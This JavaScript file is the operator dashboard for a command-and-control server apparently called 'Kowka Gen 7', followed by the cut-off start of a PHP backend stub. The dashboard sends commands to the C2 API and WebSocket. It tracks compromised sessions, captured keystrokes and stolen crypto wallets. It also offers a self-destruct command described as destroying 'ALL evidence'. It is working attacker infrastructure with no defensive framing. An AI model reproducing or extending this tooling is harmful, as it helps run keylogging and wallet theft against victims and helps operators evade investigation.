class KowkaC2Dashboard {
    constructor() {
        this.currentCommand = null;
        this.websocket = null;
        this.init();
    }

    init() {
        this.bindEvents();
        this.connectWebSocket();
        this.loadInitialData();
    }

    bindEvents() {
        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                this.switchTab(e.currentTarget.dataset.tab);
            });
        });

        // Command execution
        document.querySelectorAll('.command-card button').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const card = e.target.closest('.command-card');
                this.prepareCommand(
                    card.dataset.command,
                    JSON.parse(card.dataset.params || '{}')
                );
            });
        });

        // Terminal
        document.getElementById('terminalInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.executeTerminalCommand(e.target.value);
                e.target.value = '';
            }
        });

        document.getElementById('clearTerminal').addEventListener('click', () => {
            document.getElementById('terminalOutput').innerHTML = '';
        });

        // Modal
        document.getElementById('modalCancel').addEventListener('click', () => {
            this.hideModal();
        });

        document.getElementById('modalConfirm').addEventListener('click', () => {
            this.executeCurrentCommand();
        });

        // Self-destruct confirmation
        document.getElementById('selfDestructBtn').addEventListener('click', (e) => {
            e.stopPropagation();
            this.prepareCommand('/self_destruct', { confirmation: true });
        });

        // Refresh
        document.getElementById('refreshStatus').addEventListener('click', () => {
            this.loadInitialData();
        });
    }

    switchTab(tabName) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

        // Update content
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
        });
        document.getElementById(tabName).classList.add('active');
    }

    prepareCommand(command, params = {}) {
        this.currentCommand = { command, params };
        
        let message = `Execute <strong>${command}</strong>?`;
        if (command === '/self_destruct') {
            message = `<div class="warning-banner">
                <i class="fas fa-exclamation-triangle"></i>
                <span>FINAL WARNING: This will initiate COMPLETE self-destruction</span>
            </div>
            <p style="margin-top: 15px; color: var(--danger-color);">
                This action is IRREVERSIBLE and will destroy ALL evidence.
            </p>`;
        }

        document.getElementById('modalMessage').innerHTML = message;
        this.showModal();
    }

    showModal() {
        document.getElementById('confirmationModal').classList.add('active');
    }

    hideModal() {
        document.getElementById('confirmationModal').classList.remove('active');
        this.currentCommand = null;
    }

    async executeCurrentCommand() {
        if (!this.currentCommand) return;

        const { command, params } = this.currentCommand;
        this.hideModal();

        try {
            const response = await this.sendCommand(command, params);
            this.addToTerminal(`Command executed: ${command}`, 'success');
            this.logActivity(`Command executed: ${command}`, 'success');
            
            // Update UI based on response
            if (response.data) {
                this.updateDashboard(response.data);
            }
        } catch (error) {
            this.addToTerminal(`Command failed: ${error.message}`, 'error');
            this.logActivity(`Command failed: ${command}`, 'error');
        }
    }

    async sendCommand(command, params = {}) {
        // This would connect to your actual C2 backend API
        const response = await fetch('/api/command.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                command,
                parameters: params,
                operation_id: this.generateOperationId()
            })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        return await response.json();
    }

    executeTerminalCommand(input) {
        this.addToTerminal(input, 'command');
        
        // Parse raw terminal input
        const [command, ...args] = input.trim().split(' ');
        const params = this.parseTerminalArgs(args);
        
        this.sendCommand(command, params)
            .then(response => {
                this.addToTerminal(JSON.stringify(response, null, 2), 'response');
            })
            .catch(error => {
                this.addToTerminal(`Error: ${error.message}`, 'error');
            });
    }

    parseTerminalArgs(args) {
        const params = {};
        for (let i = 0; i < args.length; i++) {
            if (args[i].startsWith('--')) {
                const key = args[i].slice(2);
                const value = args[i + 1] && !args[i + 1].startsWith('--') ? args[++i] : true;
                params[key] = value;
            }
        }
        return params;
    }

    addToTerminal(text, type = 'info') {
        const output = document.getElementById('terminalOutput');
        const line = document.createElement('div');
        line.className = 'terminal-line';
        
        let content = '';
        switch (type) {
            case 'command':
                content = `<span class="prompt">kowka@gen7:~$</span> <span class="command">${text}</span>`;
                break;
            case 'response':
                content = `<span style="color: var(--success-color)">${text}</span>`;
                break;
            case 'error':
                content = `<span style="color: var(--danger-color)">${text}</span>`;
                break;
            default:
                content = text;
        }
        
        line.innerHTML = content;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    }

    logActivity(message, type = 'info') {
        const feed = document.getElementById('activityFeed');
        const item = document.createElement('div');
        item.className = 'activity-item';
        
        let icon = 'info-circle';
        if (type === 'success') icon = 'check-circle';
        if (type === 'error') icon = 'exclamation-circle';
        if (type === 'warning') icon = 'exclamation-triangle';
        
        item.innerHTML = `
            <i class="fas fa-${icon} ${type}"></i>
            <div class="activity-content">
                <p>${message}</p>
                <small>Just now</small>
            </div>
        `;
        
        feed.insertBefore(item, feed.firstChild);
        
        // Keep only last 10 activities
        while (feed.children.length > 10) {
            feed.removeChild(feed.lastChild);
        }
    }

    connectWebSocket() {
        // WebSocket connection for real-time updates
        this.websocket = new WebSocket('ws://your-c2-server:8080');
        
        this.websocket.onmessage = (event) => {
            const data = JSON.parse(event.data);
            this.handleRealtimeUpdate(data);
        };
        
        this.websocket.onclose = () => {
            setTimeout(() => this.connectWebSocket(), 5000);
        };
    }

    handleRealtimeUpdate(data) {
        switch (data.type) {
            case 'heartbeat':
                this.updateSystemStatus(data.data);
                break;
            case 'intelligence_report':
                this.updateIntelligenceData(data.data);
                break;
            case 'threat_update':
                this.updateThreatLevel(data.data);
                break;
        }
    }

    updateSystemStatus(status) {
        document.getElementById('activeSessions').textContent = status.active_sessions || 0;
        document.getElementById('keystrokesCaptured').textContent = status.keystrokes_captured || 0;
        document.getElementById('cryptoWallets').textContent = status.crypto_wallets || 0;
        document.getElementById('threatLevel').textContent = status.threat_level || 0;
        
        // Update threat level display
        const threatElement = document.querySelector('.threat-level .level');
        threatElement.textContent = this.getThreatLevelText(status.threat_level);
        threatElement.className = `level ${this.getThreatLevelClass(status.threat_level)}`;
    }

    updateIntelligenceData(data) {
        // Update intelligence metrics
        if (data.financial_intel) {
            document.getElementById('cryptoWallets').textContent = 
                data.financial_intel.crypto_wallets_found || 0;
        }
    }

    updateThreatLevel(level) {
        this.logActivity(`Threat level changed to: ${this.getThreatLevelText(level)}`, 'warning');
    }

    getThreatLevelText(level) {
        if (level >= 8) return 'CRITICAL';
        if (level >= 5) return 'HIGH';
        if (level >= 3) return 'MEDIUM';
        return 'LOW';
    }

    getThreatLevelClass(level) {
        if (level >= 8) return 'high';
        if (level >= 5) return 'medium';
        return 'low';
    }

    async loadInitialData() {
        try {
            const response = await this.sendCommand('/status', { type: 'comprehensive' });
            this.updateDashboard(response.data);
        } catch (error) {
            console.error('Failed to load initial data:', error);
        }
    }

    updateDashboard(data) {
        // Update all dashboard elements with real data
        if (data.metrics) {
            this.updateSystemStatus(data.metrics);
        }
    }

    generateOperationId() {
        return `op_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    }
}

// Example PHP backend (api/command.php)
/*
<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

$input = json_decode(file_get_contents('php://input'), true);

// Forward command to actual Kowka Gen 
